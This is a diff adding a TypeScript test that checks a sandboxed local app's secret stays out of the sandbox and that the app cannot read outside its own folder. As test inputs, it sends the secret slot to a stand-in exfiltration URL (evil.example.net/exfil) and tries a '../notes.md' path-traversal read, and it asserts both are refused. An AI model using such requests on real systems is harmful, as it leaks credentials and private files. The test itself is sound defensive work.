@@ -240,3 +240,99 @@ describe("SECRETS INVARIANT [release-gate:secrets]: a provisioned credential nev
     }
   }, 60000);
 });
+
+// The mini-app half of the same custody invariant: a sandboxed local app never holds a secret and
+// never reads past its own folder. Its declared secret lives in the keychain; the daemon joins it to
+// the outbound request per call (the app fetch broker - the same custody argument as the provision
+// proxy: anything the sandbox holds, its scripts can exfiltrate). This drives the REAL wiring - store
+// the secret via the console route, serve the app's HTML, broker a fetch (injected transport) - and
+// asserts the value reaches the upstream request's auth header while appearing in NOTHING the sandbox
+// ever sees; that an undeclared origin is refused without any network I/O; and that a brokered read
+// outside the app's own folder is refused.
+describe("SECRETS INVARIANT [release-gate:secrets]: an app secret never reaches the sandbox, and an app never reads past its own folder", () => {
+  const APP_SECRET = "sk-app-example-secret-DO-NOT-LEAK";
+
+  it("holds across store → serve → brokered fetch → confined read", async () => {
+    const roots: Root[] = [
+      { name: "team", dir: join(base, "team") },
+      { name: "private", dir: join(base, "private") },
+    ];
+    for (const r of roots) mkdirSync(r.dir, { recursive: true });
+    // A local app declaring one egress origin and one secret slot - plus a team file OUTSIDE the
+    // app's own folder that the app must never be able to read.
+    const appDir = join(base, "team", "apps", "crm-demo");
+    mkdirSync(appDir, { recursive: true });
+    writeFileSync(join(appDir, "app.json"), JSON.stringify({
+      name: "CRM", kind: "local",
+      origins: ["https://api.example.com"],
+      secrets: [{ name: "api-key" }],
+    }));
+    writeFileSync(join(appDir, "index.html"), "<head></head><body><h1>hi</h1></body>");
+    writeFileSync(join(base, "team", "notes.md"), "# private team notes");
+
+    // Injected transport: every upstream call is recorded with the headers it arrived with.
+    const upstreamCalls: { url: string; method: string; headers: Record<string, string> }[] = [];
+    const fakeFetch = (async (input: Parameters<typeof fetch>[0], init?: RequestInit) => {
+      const url = typeof input === "string" ? input : input instanceof URL ? input.toString() : input.url;
+      upstreamCalls.push({ url, method: init?.method ?? "GET", headers: Object.fromEntries(new Headers(init?.headers).entries()) });
+      return new Response(JSON.stringify({ ok: true }), { status: 200, headers: { "content-type": "application/json" } });
+    }) as typeof fetch;
+
+    const schedulers: SyncScheduler[] = [];
+    const app = buildClientHandler({
+      workspace: ws,
+      roots,
+      preset,
+      claudeBin: "claude",
+      fetch: fakeFetch,
+      onScheduler: (s) => schedulers.push(s),
+    });
+    const post = (route: string, b: unknown) =>
+      app(new Request("http://127.0.0.1" + route, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(b) }));
+
+    try {
+      // Store the secret through the real console route. The value lands in the (in-memory)
+      // keychain and NOWHERE else - the response admits only that something was stored.
+      const stored = await post("/api/apps/secret", { repo: "team", name: "crm-demo", secret: "api-key", value: APP_SECRET });
+      expect(stored.status).toBe(200);
+      expect(await stored.text()).not.toContain(APP_SECRET);
+
+      // The served HTML (what the sandbox boots from) never carries the value - and its CSP closes
+      // egress to the daemon plus the one declared origin.
+      const served = await app(new Request("http://127.0.0.1/apps-serve/team/crm-demo/index.html"));
+      expect(served.status).toBe(200);
+      expect(await served.text()).not.toContain(APP_SECRET);
+      expect(served.headers.get("content-security-policy")).toBe(
+        "sandbox allow-scripts allow-forms allow-popups; connect-src 'self' https://api.example.com",
+      );
+
+      // A brokered fetch to the declared origin: the daemon attaches the secret upstream…
+      const res = await post("/apps-api/fetch", { repo: "team", name: "crm-demo", secret: "api-key", url: "https://api.example.com/v1/ping" });
+      expect(res.status).toBe(200);
+      expect(upstreamCalls).toHaveLength(1);
+      expect(upstreamCalls[0]).toMatchObject({ url: "https://api.example.com/v1/ping", method: "GET" });
+      expect(upstreamCalls[0]!.headers["authorization"]).toBe(`Bearer ${APP_SECRET}`);
+      // …while the reply the sandbox receives never contains it.
+      const relayed = await res.text();
+      expect(relayed).toContain('"ok":true');
+      expect(relayed).not.toContain(APP_SECRET);
+
+      // An undeclared origin is refused before any network I/O - the exfiltration path is closed
+      // even for a compromised app that knows its own slot name.
+      const denied = await post("/apps-api/fetch", { repo: "team", name: "crm-demo", secret: "api-key", url: "https://evil.example.net/exfil" });
+      expect(denied.status).toBe(403);
+      expect(upstreamCalls).toHaveLength(1); // still just the one legitimate call
+      expect(await denied.text()).not.toContain(APP_SECRET);
+
+      // And the app's reads stop at its own folder: a team file one level up is unreachable.
+      const escape = await post("/apps-api/data", { op: "read", repo: "team", name: "crm-demo", path: "../notes.md" });
+      expect(escape.status).toBe(404);
+      const sibling = await post("/apps-api/data", { op: "read", repo: "team", name: "crm-demo", path: "notes.md" });
+      expect(sibling.status).toBe(404);
+      const own = await post("/apps-api/data", { op: "read", repo: "team", name: "crm-demo", path: "index.html" });
+      expect(own.status).toBe(200);
+    } finally {
+      for (const s of schedulers) s.stop();
+    }
+  }, 60000);
+});
